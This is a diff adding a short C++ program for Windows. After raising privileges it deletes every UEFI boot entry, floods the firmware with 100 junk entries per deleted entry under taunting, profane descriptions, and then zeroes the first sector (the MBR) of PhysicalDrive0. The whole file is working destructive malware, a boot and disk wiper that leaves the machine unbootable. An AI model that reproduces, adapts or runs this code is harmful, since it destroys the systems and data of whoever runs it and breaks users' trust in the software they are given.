@@ -1,0 +1,53 @@
+﻿#include "stdafx.h"
+#include "libuefi/Firmware.h"
+
+const std::wstring Descriptions[] = {
+	L"lol Broken by Mitsuha",
+	L"关注我!!",
+	L"B站 @宫水_五叶!!",
+	L"Haha Follow me on Bilibili",
+	L"Enjoy using computer",
+	L"Stop complaining",
+	L"u make me sick",
+	L"ur a jerk",
+	L"UEFI Safeboot suuuuuuucks"
+};
+
+int
+wmain(
+	uint16_t argc,
+	wchar_t** argv
+)
+{
+	Utils::RasiePrivileges();
+
+	std::default_random_engine random;
+
+	auto BootItems = UEFI::ListBootOption();
+	for (const auto& Item : BootItems)
+	{
+		auto FullName = fmt::format(L"Boot{}", Item);
+		auto DetailedInfo = UEFI::GetBootOption(FullName);
+		spdlog::info(L"{}:\nDescription:{}\nImagePath:{}\nGUID:{}", FullName, DetailedInfo.description(), DetailedInfo.imagePath(), DetailedInfo.guid());
+
+		UEFI::RemoveBootOption(Item);
+
+		for (size_t i = 0; i < 100; i++)
+		{
+			auto NewItem = UEFI::InsertBootOption(L"C:", Descriptions[random() % _countof(Descriptions)], L"/EFI/FUCK");
+			spdlog::info(L"Created {}", NewItem);
+		}
+	}
+
+	auto DiskHandle = CreateFileW(L"\\\\.\\PhysicalDrive0", FILE_WRITE_DATA | FILE_READ_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (DiskHandle != INVALID_HANDLE_VALUE)
+	{
+		DWORD Written = 0;
+		BYTE Sector[512]{ 0 };
+		auto bRet = WriteFile(DiskHandle, Sector, sizeof(Sector), &Written, NULL);
+
+		CloseHandle(DiskHandle);
+	}
+
+	auto Unused = _getch();
+}
